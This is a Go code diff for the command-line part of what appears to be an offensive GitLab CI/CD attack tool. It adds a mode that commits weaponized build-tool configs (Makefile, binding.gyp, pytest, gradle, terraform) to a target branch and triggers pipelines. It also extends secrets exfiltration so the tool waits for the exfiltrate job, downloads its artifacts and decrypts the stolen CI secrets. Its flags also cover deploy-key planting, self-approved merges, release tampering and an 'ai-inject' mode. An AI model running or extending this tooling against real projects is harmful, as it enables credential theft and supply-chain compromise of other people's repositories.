@@ -74,8 +74,11 @@ var (
 	// secrets exfil specific
 	atkWebhook     string
 	atkPubkeyFile  string
+	atkPrivkeyFile string
 	atkExfilMethod string
 	atkExfilTarget string
+	atkNoWait      bool
+	atkWaitTimeout time.Duration
 	// secrets API dump options
 	atkWithProjVars     bool
 	atkWithGroupVars    bool
@@ -168,6 +171,9 @@ var (
 	atkTamperTagProcScan    bool   // scan /proc/*/environ for secrets from parallel processes
 	atkTamperTagMemDump     bool   // attempt runner worker memory extraction
 	atkTamperTagExtended    bool   // extended credential sweep (crypto wallets, shell history, etc.)
+	// LOTP injection mode (Living off the Pipeline)
+	atkLOTPInject bool   // commit weaponized LOTP config to branch
+	atkLOTPTool   string // target tool: npm-gyp, npm, make, pytest, goreleaser, gradle, terraform
 )
 
 // narrow interface to allow test fakes
@@ -176,7 +182,7 @@ type attackRunner interface {
 }
 
 type secretsRunner interface {
-	RunExfil(ctx context.Context, projectID any, branch, pubkey string, runnerTags []string, exfil attack.ExfilOptions) (string, error)
+	RunExfil(ctx context.Context, projectID any, branch, pubkey string, runnerTags []string, exfil attack.ExfilOptions) (url, jobName string, err error)
 }
 
 var newAttacker = func(gl *gitlabx.Client, baseURL, authorName, authorEmail string, timeout time.Duration) attackRunner {
@@ -191,6 +197,9 @@ var newSecretsRunner = func(gl *gitlabx.Client, baseURL, authorName, authorEmail
 // Output structure for --secrets mode when --output-json is set.
 type secretsOutput struct {
 	PipelineURL      string                    `json:"pipeline_url"`
+	JobID            int64                     `json:"job_id,omitempty"`
+	JobStatus        string                    `json:"job_status,omitempty"`
+	ExfilSecrets     map[string]string         `json:"exfil_secrets,omitempty"`
 	ProjectVariables []secdump.Variable        `json:"project_variables,omitempty"`
 	GroupVariables   []secdump.Variable        `json:"group_variables,omitempty"`
 	LogFindings      []secdump.Finding         `json:"log_findings,omitempty"`
@@ -250,10 +259,45 @@ var attackCmd = &cobra.Command{
 	Short: "Run attack workflows against a target GitLab project",
 	Long:  "Attack modes allow committing CI pipelines or other actions to validate or exploit misconfigurations.",
 	RunE: func(cmd *cobra.Command, args []string) error {
-		// New: payload-only path prints YAML and exits; no token/target required
+		// New: payload-only path prints YAML/JSON and exits; no token/target required
 		if atkPayloadOnly {
 			if strings.TrimSpace(atkPayload) == "" {
 				return fmt.Errorf("--payload is required when --payload-only is set")
+			}
+			// LOTP payloads use a different output format (JSON with file paths)
+			lp := strings.ToLower(strings.TrimSpace(atkPayload))
+			if strings.HasPrefix(lp, "lotp-") || lp == "gyp" {
+				lotpTool := strings.TrimPrefix(lp, "lotp-")
+				if lotpTool == lp { // no lotp- prefix; must be "gyp"
+					lotpTool = lp
+				}
+				if strings.TrimSpace(atkCmd) == "" {
+					return fmt.Errorf("--cmd is required for LOTP payloads")
+				}
+				p, perr := payloadgen.GenerateLOTPPayload(lotpTool, atkCmd)
+				if perr != nil {
+					return fmt.Errorf("generate LOTP payload: %w", perr)
+				}
+				type fileOut struct {
+					Path    string `json:"path"`
+					Content string `json:"content"`
+				}
+				out := struct {
+					Tool        string    `json:"tool"`
+					Files       []fileOut `json:"files"`
+					Description string    `json:"description"`
+					Reference   string    `json:"reference"`
+				}{
+					Tool:        p.Tool,
+					Description: p.Description,
+					Reference:   p.Reference,
+				}
+				for _, f := range p.Files {
+					out.Files = append(out.Files, fileOut{Path: f.Path, Content: f.Content})
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
 			}
 			yaml, err := renderPayload()
 			if err != nil {
@@ -308,8 +352,11 @@ var attackCmd = &cobra.Command{
 			if atkTamperTag {
 				modes++
 			}
+			if atkLOTPInject {
+				modes++
+			}
 			if modes != 1 {
-				return fmt.Errorf("select exactly one mode: --commit-ci, --secrets, --cleanup, --deploy-key, --add-member, --ai-inject, --inject-script, --auto-merge, --tamper-release, --tamper-package, --tamper-tag, or --harvest (or use --payload-only or --discover-tags)")
+				return fmt.Errorf("select exactly one mode: --commit-ci, --secrets, --cleanup, --deploy-key, --add-member, --ai-inject, --inject-script, --lotp-inject, --auto-merge, --tamper-release, --tamper-package, --tamper-tag, or --harvest (or use --payload-only or --discover-tags)")
 			}
 		}
 
@@ -1065,6 +1112,70 @@ var attackCmd = &cobra.Command{
 			return nil
 		}
 
+		// LOTP injection mode: weaponize tool config files (binding.gyp, Makefile, etc.)
+		if atkLOTPInject {
+			if strings.TrimSpace(atkLOTPTool) == "" {
+				return fmt.Errorf("--lotp-tool is required for --lotp-inject (e.g., npm-gyp, make, pytest, goreleaser, gradle, terraform)")
+			}
+			if strings.TrimSpace(atkCmd) == "" {
+				return fmt.Errorf("--cmd is required for --lotp-inject")
+			}
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			la := attack.NewLOTPAttack(att)
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = attack.GogatozAttacks
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				return berr
+			}
+			result, err := la.InjectLOTPPayload(ctx, atkTarget, finalBranch, atkLOTPTool, atkCmd)
+			if err != nil {
+				return fmt.Errorf("LOTP inject: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] LOTP payload committed to branch %s (%d files)\n", finalBranch, len(result.FilesCommitted))
+
+			var pipelineID int64
+			var pipelineURL string
+			if atkTriggerPipeline {
+				pipelineID, pipelineURL, err = att.TriggerPipeline(ctx, atkTarget, finalBranch)
+				if err != nil {
+					return fmt.Errorf("trigger pipeline: %w", err)
+				}
+				fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", pipelineURL)
+			}
+
+			if outputJSON {
+				out := struct {
+					Branch         string   `json:"branch"`
+					Tool           string   `json:"tool"`
+					FilesCommitted []string `json:"files_committed"`
+					Description    string   `json:"description"`
+					Reference      string   `json:"reference"`
+					PipelineURL    string   `json:"pipeline_url,omitempty"`
+					PipelineID     int64    `json:"pipeline_id,omitempty"`
+				}{
+					Branch:         result.Branch,
+					Tool:           result.Tool,
+					FilesCommitted: result.FilesCommitted,
+					Description:    result.Description,
+					Reference:      result.Reference,
+					PipelineURL:    pipelineURL,
+					PipelineID:     pipelineID,
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("LOTP payload injected (tool=%s branch=%s files=%v)", result.Tool, finalBranch, result.FilesCommitted))
+			renderInfo(cmd.OutOrStdout(), result.Description)
+			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Reference: %s", result.Reference))
+			if pipelineURL != "" {
+				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Pipeline: %s", pipelineURL))
+			}
+			return nil
+		}
+
 		// secrets mode
 		if atkSecrets {
 			// parse tags
@@ -1085,20 +1196,75 @@ var attackCmd = &cobra.Command{
 				}
 				pubkey = string(b)
 			}
+			var privkeyPEM []byte
+			if strings.TrimSpace(atkPrivkeyFile) != "" {
+				b, err := os.ReadFile(strings.TrimSpace(atkPrivkeyFile))
+				if err != nil {
+					return fmt.Errorf("read --privkey-file: %w", err)
+				}
+				privkeyPEM = b
+			}
 			sr := newSecretsRunner(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
 			exfil := attack.ExfilOptions{Method: atkExfilMethod, Target: atkExfilTarget}
-			url, err := sr.RunExfil(ctx, atkTarget, atkBranch, pubkey, tags, exfil)
+			url, exfilJobNameUsed, err := sr.RunExfil(ctx, atkTarget, atkBranch, pubkey, tags, exfil)
 			if err != nil {
 				return err
 			}
-			// Try to resolve actual pipeline ID for a better URL
-			pipelineID, waitErr := attack.WaitForPipelineForRef(ctx, client, atkTarget, atkBranch, 2*time.Second, 30*time.Second)
-			if waitErr == nil && pipelineID > 0 {
-				url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
-			}
+			// Give GitLab a moment to process the commit before querying pipelines.
 			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", url)
+
+			// Wait for the exfiltrate job, download artifacts, and decrypt — default for artifact method.
+			var (
+				exfilSecrets map[string]string
+				exfilJobID   int64
+				exfilStatus  string
+				pipelineID   int64
+			)
+			exfilMethod := strings.ToLower(strings.TrimSpace(atkExfilMethod))
+			if !atkNoWait && (exfilMethod == "" || exfilMethod == "artifact") {
+				// In JSON mode write progress to stderr so stdout stays clean JSON.
+				progressW := cmd.OutOrStdout()
+				if outputJSON {
+					progressW = cmd.ErrOrStderr()
+				}
+				stdout := progressW
+				renderInfo(stdout, fmt.Sprintf("waiting for exfiltrate job (timeout: %s)...", atkWaitTimeout))
+				// WaitForExfilPipeline scans the 5 most recent pipelines on the branch each tick,
+				// so it correctly finds the exfil pipeline even when the branch-creation pipeline
+				// (triggered by EnsureBranch) appears first and contains no "exfiltrate" job.
+				pipelineID, exfilJobID, exfilStatus, _ = attack.WaitForExfilPipeline(ctx, client, atkTarget, atkBranch, exfilJobNameUsed, 5*time.Second, atkWaitTimeout)
+				if pipelineID > 0 {
+					url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
+				}
+				switch exfilStatus {
+				case "success":
+					zipBytes, zerr := secdump.DownloadJobArtifactsZIP(ctx, client, atkTarget, exfilJobID)
+					if zerr != nil {
+						renderWarning(stdout, fmt.Sprintf("artifact download failed: %v", zerr))
+					} else {
+						sJSON, sEnc, aEnc, _ := secdump.ExtractExfilFiles(zipBytes)
+						if len(privkeyPEM) > 0 && len(sEnc) > 0 && len(aEnc) > 0 {
+							exfilSecrets, err = secdump.DecryptExfilArtifacts(privkeyPEM, sEnc, aEnc)
+							if err != nil {
+								renderWarning(stdout, fmt.Sprintf("decrypt failed: %v", err))
+							}
+						} else if len(sJSON) > 0 {
+							_ = json.Unmarshal(sJSON, &exfilSecrets)
+						}
+					}
+				case "":
+					renderWarning(stdout, "exfiltrate job not found or timed out")
+				default:
+					renderWarning(stdout, fmt.Sprintf("exfiltrate job status: %s", exfilStatus))
+				}
+				if len(exfilSecrets) > 0 {
+					renderExfilSecrets(stdout, exfilSecrets)
+					persistAttackExfil(strings.TrimSpace(gitlabURL), atkTarget, 0, "", atkBranch, url, pipelineID, exfilJobID, exfilSecrets)
+				}
+			}
+
 			if outputJSON {
-				out := secretsOutput{PipelineURL: url}
+				out := secretsOutput{PipelineURL: url, JobID: exfilJobID, JobStatus: exfilStatus, ExfilSecrets: exfilSecrets}
 				if atkWithProjVars {
 					pv, err := secdump.ListProjectVariables(ctx, client, atkTarget, atkIncludeProtected)
 					if err != nil {
@@ -1200,7 +1366,7 @@ var attackCmd = &cobra.Command{
 			return err
 		}
 		// Try to resolve actual pipeline ID for a better URL
-		pipelineID, waitErr := attack.WaitForPipelineForRef(ctx, client, atkTarget, finalBranch, 2*time.Second, 30*time.Second)
+		pipelineID, waitErr := attack.WaitForPipelineForRef(ctx, client, atkTarget, finalBranch, 0, 2*time.Second, 30*time.Second)
 		if waitErr == nil && pipelineID > 0 {
 			url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
 		}
@@ -1287,6 +1453,9 @@ func init() {
 	attackCmd.Flags().StringVar(&atkWebhook, "webhook", "", "Webhook URL to POST env dump for secrets payload (payload mode)")
 	attackCmd.Flags().StringVar(&atkExfilMethod, "exfil-method", "artifact", "Exfiltration method: artifact|http|dns|icmp|git|cloud")
 	attackCmd.Flags().StringVar(&atkExfilTarget, "exfil-target", "", "Exfil target (URL, domain, IP, or git repo URL depending on method)")
+	attackCmd.Flags().StringVar(&atkPrivkeyFile, "privkey-file", "", "RSA private key PEM for decrypting exfil artifacts (pairs with --pubkey-file)")
+	attackCmd.Flags().BoolVar(&atkNoWait, "no-wait", false, "Skip waiting for the exfiltrate job to finish (disables artifact download, decrypt, and DB store)")
+	attackCmd.Flags().DurationVar(&atkWaitTimeout, "wait-timeout", 5*time.Minute, "Max time to wait for the exfiltrate job to complete (default: 5m)")
 	// secrets API dump options (for --secrets JSON output)
 	attackCmd.Flags().BoolVar(&atkWithProjVars, "project-vars", false, "Include project variables in JSON output for --secrets")
 	attackCmd.Flags().BoolVar(&atkWithGroupVars, "group-vars", false, "Include group variables in JSON output for --secrets")
@@ -1328,7 +1497,10 @@ func init() {
 	attackCmd.Flags().StringVar(&atkScriptPayload, "script-payload", "", "Shell payload to inject into the target script")
 	attackCmd.Flags().StringVar(&atkScriptPayloadFile, "script-payload-file", "", "Read injection payload from file")
 	attackCmd.Flags().BoolVar(&atkScriptPrepend, "script-prepend", true, "Prepend payload to script (true) or append (false)")
-	attackCmd.Flags().BoolVar(&atkTriggerPipeline, "trigger-pipeline", false, "Trigger a pipeline after script injection")
+	attackCmd.Flags().BoolVar(&atkTriggerPipeline, "trigger-pipeline", false, "Trigger a pipeline after script injection or LOTP inject")
+	// LOTP injection mode
+	attackCmd.Flags().BoolVar(&atkLOTPInject, "lotp-inject", false, "Commit weaponized LOTP tool config to branch (Living off the Pipeline attack)")
+	attackCmd.Flags().StringVar(&atkLOTPTool, "lotp-tool", "", "LOTP tool to weaponize: npm-gyp|gyp|npm|make|pytest|goreleaser|gradle|terraform (use with --lotp-inject or --payload-only)")
 	// Auto-merge mode (supply chain)
 	attackCmd.Flags().BoolVar(&atkAutoMerge, "auto-merge", false, "Create MR, self-approve, and merge (supply chain attack)")
 	attackCmd.Flags().StringVar(&atkAutoMergeFile, "auto-merge-file", "", "File path to modify in auto-merge (default: .gitlab-ci.yml)")
